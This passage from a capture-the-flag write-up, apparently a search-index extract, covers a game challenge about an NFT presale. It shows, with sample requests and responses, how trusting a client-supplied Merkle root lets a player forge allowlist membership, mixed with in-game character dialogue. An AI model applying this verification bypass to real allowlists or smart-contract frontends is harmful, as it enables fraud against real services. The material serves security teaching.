pre-sale, get lost loser!\" } As this parameter value can be changed to any value we like we can force the validation to succeed by \"planting our own merkle tree\". We can create our own merkle tree containing our wallet address and pass the corresponding root and proof values. The second hint points us to a repo which can be used to create merkle trees. Let's clone the repo. We see the following line which defines the values to be included in the Merkle tree. allowlist = ['0x1337133713371337133713371337133713371337','0x0000000000000000000000000000000000000000'] Let's add our wallet address to the list and run the script. mt_user@cf57d0813b27:~$ python3 merkle_tree.py Root: 0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a'] Let's send a modified request containing our newly generated Merkle tree. The validation succeeds. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"true\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"You're on the list and good to go! Now... BUY A SPORC!\" } Now let's switch the validate parameter to false to purchase the NFT. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"false\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"Did you approve a 100 KC transaction for our wallet? The transaction failed with \\\"Insufficient Allowance\\\".\" } Let's issue the request again after approving the 100 KC transaction from a KTM. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"false\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"Success! You are now the proud owner of BSRS Token #000304. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS304, or check it out in the gallery!<br>Transaction: 0x10948c5bd5759cdceb9e448c4da4ceac938015edef1ae0043b1939d53b4dd23d, Block: 81363<br><br>Remember: Just like we planned, tell everyone you know to <u><em>BUY A BoredSporc</em></u>.<br>When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!<br><br>The market will tank, but we'll all be rich!!!\" } Rejoice What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us? I don't know if I buy that, but you're on the list, so... myeah. Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency. That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh? Chat with Grinchum \ud83d\ude20 We wants them... we needs them... Must.. have.. the Preciouses. They stole them from us, sneaky little humanses. \ud83d\ude42 No, not the humanses, they're my friends. \ud83d\ude0f You don't have any friends. NOBODY likes YOU. You're a liar, and a thief, and a.... grriiiiiiinch. \ud83d\ude22 Go away... we don't need you anymore. The humanses protect us now. \ud83d\ude20 Go away? I protected us. The preciouses are safe because of ME! \ud83d\ude42 Leave now, and never.. come back. \ud83d\ude03 Leave now, and never.. come back! \ud83d\ude01LEAVE NOW, AND NEVER.. COME BACK!\ud83d\ude2c Friendly human, please go to jolly human's castle! Go on, we will meet you there!","title":"3. Exploit a Smart Contract"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/#chat-with-luigi","text":"Psst. Hey, slick - over here. Myeah. You look like a sucker ahem I mean, savvy. I got some exclusive, very rare, very valuable NFTs for sale. But I run a KringleCoin-only business. Kapeesh? Ever buy somethin' with cryptocurrency before? Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can! But we're currently in pre-sale, and you gotta be on the list. Myeah, see? BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise. So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do. I got a business to run. You can't buy nothin' right now, so scram. Kapeesh?","title":"Chat with Luigi"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/#terminal","text":"Welcome to the Bored Sporc Rowboat Society Presale Page! The presale is only available to those select individuals who have earned a place on our exclusive presale list. If you're not on the list, you might as well leave, because you ain't gettin' a Sporc until we open up sales to the general public. If you are on the list, welcome! Here's all you gotta do to pre-purchase your Sporc: The presale price for a Sporc is 100 KringleCoin (KC). Yeah, we know that's crazy cheap, but we take care of our buds. When we open sales to the public, these things are gonna shoot to the moon. First, you're gonna want to make sure that your wallet address is on the approved list. Just make sure to leave the \"Validate only\" box checked, fill in the form, and we'll let you know if you're good-to-go. Before you do anything else, it's always good to be sure you're doing everything right and your address is validated as being on the list (it's actually something called a Merkle Tree... very high-techy-techy stuff). To check if you're on the list, enter your wallet address and the string of proof values that we gave you when we told you that you were on the pre-approved list. Those values should be hex strings (i.e. start with \"0x\" and consist of a bunch of values that are 0-9 or \"a,\" \"b,\" \"c,\" \"d,\" \"e,\" or \"f\"). If you're confused, give us a shout and we can help. If you're not on the presale list, you're not on the list. Don't beg and plead with us to put you on the list. Seriously - we've only put Sporcs that we're tight with on the list. WE decided who's on the list (COOL SPORCS ONLY). We don't just let anyone on. If we were putting you on the list, we would've contacted you... not the other way around. Once you've confirmed everything works and you're sure you have the whole validated-and-on-the-list thing down, just go find a KTM and pre-approve a 100 KC transaction from the wallet you validated. That way, the funds are ready to go. Our Wallet Address is 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a. Once you've pre-approved the payment, come back here do the same thing you did when you validated your address, just uncheck the \"Validate Only\" thing. Then, we'll grab your K'Coin, mint a brand spankin' new Sporc, and fire it into your wallet. Zap! Just like that, you'll be the owner of an amazing piece of the digital domain and a member of the Bored Sporc Rowboat Society for life! (Or, until you decide to cash-out and sell your Bored Sporc). Hint 1: You're going to need a Merkle Tree of your own. Math is hard. Professor Petabyte can help you out. Hint 2: You can change something that you shouldn't be allowed to change. This repo might help! After reading through the resources mentioned in Hint 1, we understand the working of Merkle trees and that they can be used to verify presence of an element in a set. We infer that the pre sale list uses a merkle tree to store the allowed wallet addresses. In order to validate the presence our wallet address in the list, we are required to provide our wallet address and the proof. Ideally at the backend these inputs would be used to compute the root and if this computed root matches the actual root value the verification would pass. However there is a vulnerability in the validation logic. In the request sent to the server there is a root parameter and it appears that the computed root is compared with this root parameter. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"true\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"That address isn't on the list/Merkel Tree. If you're legit, you may need to try another of your addresses.<br>If you're trying to scam your way into the pre-sale, get lost loser!\" } As this parameter value can be changed to any value we like we can force the validation to succeed by \"planting our own merkle tree\". We can create our own merkle tree containing our wallet address and pass the corresponding root and proof values. The second hint points us to a repo which can be used to create merkle trees. Let's clone the repo. We see the following line which defines the values to be included in the Merkle tree. allowlist = ['0x1337133713371337133713371337133713371337','0x0000000000000000000000000000000000000000'] Let's add our wallet address to the list and run the script. mt_user@cf57d0813b27:~$ python3 merkle_tree.py Root: 0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a'] Let's send a modified request containing our newly generated Merkle tree. The validation succeeds. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"true\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"You're on the list and good to go! Now... BUY A SPORC!\" } Now let's switch the validate parameter to false to purchase the NFT. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"false\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"Did you approve a 100 KC transaction for our wallet? The transaction failed with \\\"Insufficient Allowance\\\".\" } Let's issue the request again after approving the 100 KC transaction from a KTM. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x849c21622ed0686867a4b7d1e3da3f2bf3ad341d07a10c7672b723fee8fb16ed\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"false\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"Success! You are now the proud owner of BSRS Token #000304. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS304, or check it out in the gallery!<br>Transaction: 0x10948c5bd5759cdceb9e448c4da4ceac938015edef1ae0043b1939d53b4dd23d, Block: 81363<br><br>Remember: Just like we planned, tell everyone you know to <u><em>BUY A BoredSporc</em></u>.<br>When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!<br><br>The market will tank, but we'll all be rich!!!\" }","title":"Terminal"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/#rejoice","text":"What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us? I don't know if I buy that, but you're on the list, so... myeah. Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency. That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh?","title":"Rejoice"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/#chat-with-grinchum","text":"\ud83d\ude20 We wants them... we needs them... Must.. have.. the Preciouses. They stole them from us, sneaky little humanses. \ud83d\ude42 No, not the humanses, they're my friends. \ud83d\ude0f You don't have any friends. NOBODY likes YOU. You're a liar, and a thief, and a.... grriiiiiiinch. \ud83d\ude22 Go away... we don't need you anymore. The humanses protect us now. \ud83d\ude20 Go away? I protected us. The preciouses are safe because of ME! \ud83d\ude42 Leave now, and never.. come back. \ud83d\ude03 Leave now, and never.. come back! \ud83d\ude01LEAVE NOW, AND NEVER.. COME BACK!\ud83d\ude2c Friendly human, please go to jolly human's castle! Go on, we will meet you there!","title":"Chat with Grinchum"}]}